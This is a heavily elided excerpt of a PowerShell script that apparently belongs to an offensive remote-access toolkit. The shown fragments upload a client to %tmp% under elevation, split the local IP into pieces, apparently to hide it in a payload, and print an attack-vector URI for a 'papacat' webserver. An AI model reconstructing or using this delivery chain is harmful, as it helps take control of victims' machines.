...
$CmdletVersion = "v2.2.13" #CmdLet version
...
If($Python_version)
{
   ...
   If($Elevate -ieq "True")
   {
      ...
      Write-Host "     vbs: upload $ClientName to %tmp% .." -ForegroundColor Yellow
...
If(Test-Path -Path "$ClientName" -EA SilentlyContinue)
{
   ...
   $FirstRange = $Local_Host[0,1,2] -join ''               # 192
   $SeconRange = $Local_Host[3,4,5,6,7] -join ''           # .168.
   $TrithRange = $Local_Host[8,9,10,11,12,13,14] -join ''  # 1.180
...
If($Python_version)
{
   ...
   Write-Host "`n"; #Attack Vector Uri
   write-host "papacat webserver: '$APACHE'" -ForegroundColor DarkGray
